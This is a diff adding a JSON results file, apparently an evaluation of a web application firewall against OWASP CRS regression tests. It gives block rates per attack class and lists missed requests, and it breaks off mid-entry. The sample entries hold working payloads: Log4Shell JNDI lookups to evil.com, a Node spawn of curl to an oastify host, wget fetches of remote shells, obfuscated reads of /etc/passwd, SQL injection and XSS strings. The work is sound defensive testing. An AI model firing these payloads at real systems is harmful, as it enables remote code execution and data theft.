@@ -1,0 +1,1561 @@
+{
+  "source": "OWASP CRS regression tests (Apache-2.0)",
+  "skipped_encoded_or_bad": 1,
+  "attack": {
+    "LFI": {
+      "PL1": {
+        "total": 57,
+        "blocked": 10,
+        "detected": 10,
+        "rejected_400": 2,
+        "block_rate": 0.2105,
+        "detect_rate": 0.2105
+      },
+      "PL2": {
+        "total": 10,
+        "blocked": 1,
+        "detected": 1,
+        "rejected_400": 0,
+        "block_rate": 0.1,
+        "detect_rate": 0.1
+      }
+    },
+    "RFI": {
+      "PL1": {
+        "total": 14,
+        "blocked": 0,
+        "detected": 0,
+        "rejected_400": 0,
+        "block_rate": 0.0,
+        "detect_rate": 0.0
+      },
+      "PL2": {
+        "total": 22,
+        "blocked": 2,
+        "detected": 2,
+        "rejected_400": 0,
+        "block_rate": 0.0909,
+        "detect_rate": 0.0909
+      }
+    },
+    "RCE": {
+      "PL1": {
+        "total": 452,
+        "blocked": 34,
+        "detected": 34,
+        "rejected_400": 2,
+        "block_rate": 0.0796,
+        "detect_rate": 0.0796
+      },
+      "PL2": {
+        "total": 246,
+        "blocked": 54,
+        "detected": 54,
+        "rejected_400": 0,
+        "block_rate": 0.2195,
+        "detect_rate": 0.2195
+      },
+      "PL3": {
+        "total": 93,
+        "blocked": 7,
+        "detected": 7,
+        "rejected_400": 0,
+        "block_rate": 0.0753,
+        "detect_rate": 0.0753
+      }
+    },
+    "PHP": {
+      "PL1": {
+        "total": 275,
+        "blocked": 25,
+        "detected": 25,
+        "rejected_400": 6,
+        "block_rate": 0.1127,
+        "detect_rate": 0.1127
+      },
+      "PL2": {
+        "total": 12,
+        "blocked": 0,
+        "detected": 0,
+        "rejected_400": 0,
+        "block_rate": 0.0,
+        "detect_rate": 0.0
+      },
+      "PL3": {
+        "total": 39,
+        "blocked": 2,
+        "detected": 2,
+        "rejected_400": 5,
+        "block_rate": 0.1795,
+        "detect_rate": 0.1795
+      }
+    },
+    "GENERIC": {
+      "PL1": {
+        "total": 124,
+        "blocked": 7,
+        "detected": 7,
+        "rejected_400": 0,
+        "block_rate": 0.0565,
+        "detect_rate": 0.0565
+      },
+      "PL2": {
+        "total": 112,
+        "blocked": 5,
+        "detected": 5,
+        "rejected_400": 0,
+        "block_rate": 0.0446,
+        "detect_rate": 0.0446
+      },
+      "PL3": {
+        "total": 9,
+        "blocked": 0,
+        "detected": 0,
+        "rejected_400": 0,
+        "block_rate": 0.0,
+        "detect_rate": 0.0
+      }
+    },
+    "XSS": {
+      "PL1": {
+        "total": 188,
+        "blocked": 55,
+        "detected": 64,
+        "rejected_400": 0,
+        "block_rate": 0.2926,
+        "detect_rate": 0.3404
+      },
+      "PL2": {
+        "total": 21,
+        "blocked": 9,
+        "detected": 9,
+        "rejected_400": 0,
+        "block_rate": 0.4286,
+        "detect_rate": 0.4286
+      }
+    },
+    "SQLI": {
+      "PL1": {
+        "total": 324,
+        "blocked": 81,
+        "detected": 81,
+        "rejected_400": 0,
+        "block_rate": 0.25,
+        "detect_rate": 0.25
+      },
+      "PL2": {
+        "total": 498,
+        "blocked": 70,
+        "detected": 70,
+        "rejected_400": 0,
+        "block_rate": 0.1406,
+        "detect_rate": 0.1406
+      },
+      "PL3": {
+        "total": 41,
+        "blocked": 5,
+        "detected": 5,
+        "rejected_400": 0,
+        "block_rate": 0.122,
+        "detect_rate": 0.122
+      },
+      "PL4": {
+        "total": 9,
+        "blocked": 2,
+        "detected": 2,
+        "rejected_400": 0,
+        "block_rate": 0.2222,
+        "detect_rate": 0.2222
+      }
+    },
+    "JAVA": {
+      "PL1": {
+        "total": 604,
+        "blocked": 33,
+        "detected": 33,
+        "rejected_400": 34,
+        "block_rate": 0.1109,
+        "detect_rate": 0.1109
+      },
+      "PL2": {
+        "total": 182,
+        "blocked": 20,
+        "detected": 20,
+        "rejected_400": 12,
+        "block_rate": 0.1758,
+        "detect_rate": 0.1758
+      },
+      "PL3": {
+        "total": 330,
+        "blocked": 0,
+        "detected": 0,
+        "rejected_400": 0,
+        "block_rate": 0.0,
+        "detect_rate": 0.0
+      },
+      "PL4": {
+        "total": 26,
+        "blocked": 20,
+        "detected": 20,
+        "rejected_400": 0,
+        "block_rate": 0.7692,
+        "detect_rate": 0.7692
+      }
+    }
+  },
+  "negative": {
+    "LFI": {
+      "total": 16,
+      "blocked": 0,
+      "detected": 0,
+      "rejected_400": 0,
+      "block_rate": 0.0
+    },
+    "RFI": {
+      "total": 6,
+      "blocked": 0,
+      "detected": 0,
+      "rejected_400": 0,
+      "block_rate": 0.0
+    },
+    "RCE": {
+      "total": 344,
+      "blocked": 14,
+      "detected": 14,
+      "rejected_400": 1,
+      "block_rate": 0.0407
+    },
+    "PHP": {
+      "total": 117,
+      "blocked": 0,
+      "detected": 0,
+      "rejected_400": 3,
+      "block_rate": 0.0
+    },
+    "GENERIC": {
+      "total": 42,
+      "blocked": 0,
+      "detected": 0,
+      "rejected_400": 0,
+      "block_rate": 0.0
+    },
+    "XSS": {
+      "total": 54,
+      "blocked": 2,
+      "detected": 2,
+      "rejected_400": 0,
+      "block_rate": 0.037
+    },
+    "SQLI": {
+      "total": 163,
+      "blocked": 5,
+      "detected": 5,
+      "rejected_400": 1,
+      "block_rate": 0.0307
+    },
+    "JAVA": {
+      "total": 34,
+      "blocked": 2,
+      "detected": 2,
+      "rejected_400": 0,
+      "block_rate": 0.0588
+    }
+  },
+  "response": {
+    "LEAK": {
+      "total": 11,
+      "detected": 0,
+      "blocked_200": 0,
+      "blocked_500": 0,
+      "detect_rate": 0.0
+    },
+    "LEAK-SQL": {
+      "total": 24,
+      "detected": 6,
+      "blocked_200": 3,
+      "blocked_500": 6,
+      "detect_rate": 0.25
+    },
+    "LEAK-JAVA": {
+      "total": 9,
+      "detected": 0,
+      "blocked_200": 0,
+      "blocked_500": 0,
+      "detect_rate": 0.0
+    },
+    "LEAK-PHP": {
+      "total": 12,
+      "detected": 1,
+      "blocked_200": 0,
+      "blocked_500": 1,
+      "detect_rate": 0.0833
+    },
+    "LEAK-IIS": {
+      "total": 7,
+      "detected": 0,
+      "blocked_200": 0,
+      "blocked_500": 0,
+      "detect_rate": 0.0
+    },
+    "WEBSHELL": {
+      "total": 10,
+      "detected": 0,
+      "blocked_200": 0,
+      "blocked_500": 0,
+      "detect_rate": 0.0
+    },
+    "LEAK-RUBY": {
+      "total": 13,
+      "detected": 0,
+      "blocked_200": 0,
+      "blocked_500": 0,
+      "detect_rate": 0.0
+    }
+  },
+  "misses": {
+    "LFI/PL1": [
+      {
+        "rule": "930100",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "930100",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "930100",
+        "pl": 1,
+        "method": "POST",
+        "uri": "/post",
+        "body": "<?xml version=\"1.0\"?><root><a probe=\"0x5c0x2e.%00/\"></a></root>",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "930110",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "930110",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get?arg=..\\pineapple",
+        "body": "",
+        "action": "ALLOW"
+      }
+    ],
+    "LFI/PL2": [
+      {
+        "rule": "930121",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "930121",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "930121",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "930121",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "930121",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get",
+        "body": "",
+        "action": "ALLOW"
+      }
+    ],
+    "RFI/PL1": [
+      {
+        "rule": "931100",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get/wp-content/themes/thedawn/lib/scripts/timthumb.php?src=http://66.240.183.75/crash.php",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "931100",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get/module/my_prestashop_module/ajax?src=https://[2001:41d0:701:1100::29c8]/gecko.php",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "931100",
+        "pl": 1,
+        "method": "POST",
+        "uri": "/api/",
+        "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><catalog><tag>ftp%3A%2F%2F1.1.1.1</tag></catalog>",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "931100",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get/module/my_prestashop_module/ajax?src=https://2001:41d0:701:1100::29c8/gecko.php",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "931100",
+        "pl": 1,
+        "method": "POST",
+        "uri": "/post",
+        "body": "<?xml version=\"1.0\"?><root><a probe=\"http://66.240.183.75/crash.php\"></a></root>",
+        "action": "ALLOW"
+      }
+    ],
+    "RFI/PL2": [
+      {
+        "rule": "931130",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get?x=file://foo.bar",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "931130",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get?x=ftp://foo.bar",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "931130",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get?x=ftps://foo.bar",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "931130",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get?x=http://foo.bar",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "931130",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get?x=https://foo.bar",
+        "body": "",
+        "action": "ALLOW"
+      }
+    ],
+    "RCE/PL1": [
+      {
+        "rule": "932120",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get?932120-1=Invoke-WebRequest%20http://example.com/path/file.ps1",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "932120",
+        "pl": 1,
+        "method": "POST",
+        "uri": "/post",
+        "body": "932120-2=Invoke-WebRequest http://example.com/path/file.ps1",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "932120",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "932120",
+        "pl": 1,
+        "method": "POST",
+        "uri": "/post",
+        "body": "cmd=powershell%20C%3A%5Cwindows%5Csystem32%5Cnotepad.exe",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "932120",
+        "pl": 1,
+        "method": "POST",
+        "uri": "/post",
+        "body": "<?xml version=\"1.0\"?><root><a probe=\"Invoke-WebRequest http://example.com/path/file.ps1\"></a></root>",
+        "action": "ALLOW"
+      }
+    ],
+    "RCE/PL2": [
+      {
+        "rule": "932131",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "932161",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "932161",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "932161",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "932161",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get",
+        "body": "",
+        "action": "ALLOW"
+      }
+    ],
+    "RCE/PL3": [
+      {
+        "rule": "932190",
+        "pl": 3,
+        "method": "GET",
+        "uri": "/get?id=cat%2B%2Fet*%2F*wd",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "932190",
+        "pl": 3,
+        "method": "GET",
+        "uri": "/get?id=cat%2B%2FET*%2F*WD",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "932190",
+        "pl": 3,
+        "method": "GET",
+        "uri": "/get?id=%2F%3F%3F%3F%2F%3Fs",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "932190",
+        "pl": 3,
+        "method": "GET",
+        "uri": "/get",
+        "body": "{\"foo\" : \";+cat+/e't'*/pa'?s'wd\"}",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "932190",
+        "pl": 3,
+        "method": "GET",
+        "uri": "/get",
+        "body": "{\"foo\" : \";+cat+/e\\\\t\\\\*/pa\\\\?s\\\\wd\"}",
+        "action": "ALLOW"
+      }
+    ],
+    "PHP/PL1": [
+      {
+        "rule": "933100",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get?foo=%3C%3F%20exec%28%27wget%20http%3A%2F%2Fr57.biz%2Fr57.txt%20-O",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "933100",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get?foo=somePhpWouldGoHere%5B%2Fphp%5D",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "933100",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get?foo=somePhpWouldGoHere%5B%5Cphp%5D",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "933100",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get?foo=%3C%3Fxml%20%3Aecho%201%3B",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "933100",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get?foo=%3C%3Fxml%20%3Aecho%201%3B",
+        "body": "",
+        "action": "ALLOW"
+      }
+    ],
+    "PHP/PL3": [
+      {
+        "rule": "933111",
+        "pl": 3,
+        "method": "GET",
+        "uri": "/upload",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "933131",
+        "pl": 3,
+        "method": "GET",
+        "uri": "/get?x=$_%53%20ERVER['REQUEST_URI'];",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "933131",
+        "pl": 3,
+        "method": "POST",
+        "uri": "/post",
+        "body": "<?xml version=\"1.0\"?><root><a probe=\"$_S ERVER['REQUEST_URI'];\"></a></root>",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "933161",
+        "pl": 3,
+        "method": "POST",
+        "uri": "/post?%20checkDate%28%29",
+        "body": "gethostbynamE(",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "933161",
+        "pl": 3,
+        "method": "POST",
+        "uri": "/post?foo=chroot%09%28%29",
+        "body": "gethostbynamE(",
+        "action": "ALLOW"
+      }
+    ],
+    "PHP/PL2": [
+      {
+        "rule": "933151",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get/array_diff%20%28",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "933151",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get?date_ADD%28%29",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "933151",
+        "pl": 2,
+        "method": "POST",
+        "uri": "/post",
+        "body": "gethostbynamE(",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "933151",
+        "pl": 2,
+        "method": "POST",
+        "uri": "/post",
+        "body": "<?xml version=\"1.0\"?><root><a probe=\"array_diff (\"></a></root>",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "933152",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get/pg_enter_pipeline_mode%20%28",
+        "body": "",
+        "action": "ALLOW"
+      }
+    ],
+    "GENERIC/PL1": [
+      {
+        "rule": "934100",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get?foo=_%24%24ND_FUNC%24%24_",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "934100",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get?foo=__js_function",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "934100",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get?foo=eval%28String.fromCharCode",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "934100",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get?foo=function%28%29+%7B",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "934100",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get?foo=new+Function+%28",
+        "body": "",
+        "action": "ALLOW"
+      }
+    ],
+    "GENERIC/PL2": [
+      {
+        "rule": "934101",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get?foo=%23%7Brequire.main.constructor._load%28child_process%29.spawn%28%27foo%27%2C%5B%27bar%27%2C%27bar%27%5D%29%7D",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "934101",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get?foo=%23%7Brequire.main.constructor._load%28%27fs%27%29.write%28fd%2C%20str%2C%200%2C%20null%2C%20%7B%7D%29%7D",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "934101",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get?foo=%23%7Brequire.main.constructor._load%28%27child_process%27%29.fork%28%22binary%22%2C%20%5B%22bar%22%5D%2C%20%7B%7D%29%7D",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "934101",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get/rce/lol%3drequire%3bx%3d\"child_process\"%3blol(x).spawn('curl',+['5gmgdi7mjd5o3g8oj8gawq6n8ee5ht6.oastify.com'])%3b",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "934101",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get",
+        "body": "",
+        "action": "ALLOW"
+      }
+    ],
+    "GENERIC/PL3": [
+      {
+        "rule": "934210",
+        "pl": 3,
+        "method": "POST",
+        "uri": "/post",
+        "body": "{\"created_by__departments__employees__user__username__startswith\":\"p\",\"created_by__departments__employees__user__id\":1}",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "934210",
+        "pl": 3,
+        "method": "GET",
+        "uri": "/get?username__startswith=p",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "934210",
+        "pl": 3,
+        "method": "POST",
+        "uri": "/post",
+        "body": "{\"password__isnull\":true}",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "934210",
+        "pl": 3,
+        "method": "GET",
+        "uri": "/get?balance__gte=1000",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "934210",
+        "pl": 3,
+        "method": "POST",
+        "uri": "/post",
+        "body": "{\"username__startswith\":\"p\"}",
+        "action": "ALLOW"
+      }
+    ],
+    "XSS/PL1": [
+      {
+        "rule": "941100",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get/char_test?mime=text/xml&body=%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%20src=%22data:,alert(1)%22%20/%3E",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "941100",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "941100",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/?id=%u00abscript%u00bballert(1)%u00ab/script%u00bb",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "941100",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/?id=%u2039script%u203aalert(1)%u2039/script%u203a",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "941110",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get",
+        "body": "",
+        "action": "ALLOW"
+      }
+    ],
+    "XSS/PL2": [
+      {
+        "rule": "941150",
+        "pl": 2,
+        "method": "POST",
+        "uri": "/post",
+        "body": "941150-1%3D%3Ca%20href%3D%22test%22",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "941150",
+        "pl": 2,
+        "method": "POST",
+        "uri": "/post",
+        "body": "<?xml version=\"1.0\"?><root><a probe=\"941150-1%3D%3Ca%20href%3D%22test%22\"></a></root>",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "941181",
+        "pl": 2,
+        "method": "POST",
+        "uri": "/post/foo",
+        "body": "941181-1=-->",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "941181",
+        "pl": 2,
+        "method": "POST",
+        "uri": "/post/foo",
+        "body": "941181-1=--%3E",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "941181",
+        "pl": 2,
+        "method": "POST",
+        "uri": "/post/bar",
+        "body": "-->=941181-3",
+        "action": "ALLOW"
+      }
+    ],
+    "SQLI/PL1": [
+      {
+        "rule": "942100",
+        "pl": 1,
+        "method": "POST",
+        "uri": "/post",
+        "body": "var=2010-01-01'+sleep(20.to_i)+'",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "942100",
+        "pl": 1,
+        "method": "POST",
+        "uri": "/post",
+        "body": "var=sleep(20)",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "942100",
+        "pl": 1,
+        "method": "POST",
+        "uri": "/post",
+        "body": "var=unittests@coreruleset.org\" sleep(10.to_i) \"",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "942100",
+        "pl": 1,
+        "method": "POST",
+        "uri": "/post",
+        "body": "var=\" | type %SystemDrive%\\\\config.ini | \"",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "942100",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/?id=%u2019%20OR%201%3D1--%20-",
+        "body": "",
+        "action": "ALLOW"
+      }
+    ],
+    "SQLI/PL2": [
+      {
+        "rule": "942101",
+        "pl": 2,
+        "method": "POST",
+        "uri": "/post/sleep(20)",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "942101",
+        "pl": 2,
+        "method": "POST",
+        "uri": "/post/unittests@coreruleset.org\"%20sleep(10.to_i)%20\"",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "942101",
+        "pl": 2,
+        "method": "POST",
+        "uri": "/post/foo/24'union+all+select+1,2,3+from+aa",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "942101",
+        "pl": 2,
+        "method": "POST",
+        "uri": "/post/foo/24'union+all+select+1,2,3+from+aa/bar",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "942101",
+        "pl": 2,
+        "method": "POST",
+        "uri": "/post/%2A/%2A/2+union+all/bar",
+        "body": "",
+        "action": "ALLOW"
+      }
+    ],
+    "SQLI/PL3": [
+      {
+        "rule": "942251",
+        "pl": 3,
+        "method": "GET",
+        "uri": "/get?var=%20HAVING%20COUNT%28CustomerID%29%20%3E%205",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "942420",
+        "pl": 3,
+        "method": "POST",
+        "uri": "/post",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "942420",
+        "pl": 3,
+        "method": "POST",
+        "uri": "/post",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "942420",
+        "pl": 3,
+        "method": "POST",
+        "uri": "/post",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "942420",
+        "pl": 3,
+        "method": "POST",
+        "uri": "/post",
+        "body": "",
+        "action": "ALLOW"
+      }
+    ],
+    "SQLI/PL4": [
+      {
+        "rule": "942421",
+        "pl": 4,
+        "method": "GET",
+        "uri": "/get",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "942421",
+        "pl": 4,
+        "method": "GET",
+        "uri": "/get",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "942421",
+        "pl": 4,
+        "method": "GET",
+        "uri": "/get",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "942432",
+        "pl": 4,
+        "method": "POST",
+        "uri": "/post",
+        "body": "var=%3b%3bdd%20foo%20bar",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "942432",
+        "pl": 4,
+        "method": "POST",
+        "uri": "/post",
+        "body": "id=%E2%80%99%20%23",
+        "action": "ALLOW"
+      }
+    ],
+    "JAVA/PL1": [
+      {
+        "rule": "944100",
+        "pl": 1,
+        "method": "POST",
+        "uri": "/post",
+        "body": "test=java.lang.ProcessBuilder",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "944100",
+        "pl": 1,
+        "method": "POST",
+        "uri": "/post",
+        "body": "java.lang.ProcessBuilder=test",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "944100",
+        "pl": 1,
+        "method": "POST",
+        "uri": "/post",
+        "body": "test=value",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "944100",
+        "pl": 1,
+        "method": "POST",
+        "uri": "/post",
+        "body": "test=value",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "944100",
+        "pl": 1,
+        "method": "POST",
+        "uri": "/post",
+        "body": "test=value",
+        "action": "ALLOW"
+      }
+    ],
+    "JAVA/PL2": [
+      {
+        "rule": "944151",
+        "pl": 2,
+        "method": "POST",
+        "uri": "/post",
+        "body": "foo=${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/webshell}",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "944151",
+        "pl": 2,
+        "method": "POST",
+        "uri": "/post",
+        "body": "foo=$\\u007Bjndi:ldap://evil.com/webshell}",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "944151",
+        "pl": 2,
+        "method": "POST",
+        "uri": "/post",
+        "body": "{\"foo\": \"$&LBRACE;jndi:ldap://evil.com/webshell}\"}",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "944151",
+        "pl": 2,
+        "method": "POST",
+        "uri": "/post",
+        "body": "{\"foo\": \"%24%5Cu007Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D\"}",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "944151",
+        "pl": 2,
+        "method": "POST",
+        "uri": "/post",
+        "body": "{\"foo\": \"$\\u0026lbracejndi:ldap://evil.com/webshell}\"}",
+        "action": "ALLOW"
+      }
+    ],
+    "JAVA/PL4": [
+      {
+        "rule": "944152",
+        "pl": 4,
+        "method": "POST",
+        "uri": "/post",
+        "body": "foo=${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/webshell}",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "944152",
+        "pl": 4,
+        "method": "POST",
+        "uri": "/post",
+        "body": "foo=$\\u007Bjndi:ldap://evil.com/webshell}",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "944152",
+        "pl": 4,
+        "method": "POST",
+        "uri": "/post",
+        "body": "{\"foo\": \"$&LBRACE;jndi:ldap://evil.com/webshell}\"}",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "944152",
+        "pl": 4,
+        "method": "POST",
+        "uri": "/post",
+        "body": "{\"foo\": \"%24%5Cu007Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D\"}",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "944152",
+        "pl": 4,
+        "method": "POST",
+        "uri": "/post",
+        "body": "{\"foo\": \"$\\u0026lbracejndi:ldap://evil.com/webshell}\"}",
+        "action": "ALLOW"
+      }
+    ],
+    "JAVA/PL3": [
+      {
+        "rule": "944300",
+        "pl": 3,
+        "method": "POST",
+        "uri": "/post",
+        "body": "test=cnVudGltZQ",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "944300",
+        "pl": 3,
+        "method": "POST",
+        "uri": "/post",
+        "body": "cnVudGltZQ=test",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "944300",
+        "pl": 3,
+        "method": "POST",
+        "uri": "/post",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "944300",
+        "pl": 3,
+        "method": "POST",
+        "uri": "/post",
+        "body": "",
+        "action": "ALLOW"
+      },
+      {
+        "rule": "944300",
+        "pl": 3,
+        "method": "POST",
+        "uri": "/post",
+        "body": "",
+        "action": "ALLOW"
+      }
+    ]
+  },
+  "negative_blocked_examples": {
+    "RCE": [
+      {
+        "rule": "932207",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get",
+        "body": "",
+        "action": "BLOCK"
+      },
+      {
+        "rule": "932207",
+        "pl": 2,
+        "method": "GET",
+        "uri": "/get",
+        "body": "",
+        "action": "BLOCK"
+      },
+      {
+        "rule": "932230",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get?foo=system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv",
+        "body": "",
+        "action": "BLOCK"
+      },
+      {
+        "rule": "932230",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get?foo=http://ricky.ilmerlodellarocca.com/upload.php;lwp-download%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;wget%20http://shinnon",
+        "body": "",
+        "action": "BLOCK"
+      },
+      {
+        "rule": "932230",
+        "pl": 1,
+        "method": "POST",
+        "uri": "/post",
+        "body": "arg1=Something+else+2+%26%238222%3BThe+Title%26%238221%3B.+After+something&arg2=system('dig%20cd%20/tmp;ftp%20http://turbatu.altervista.org/apache_32.png%20-O%2",
+        "action": "BLOCK"
+      }
+    ],
+    "XSS": [
+      {
+        "rule": "941100",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/get",
+        "body": "",
+        "action": "BLOCK"
+      },
+      {
+        "rule": "941140",
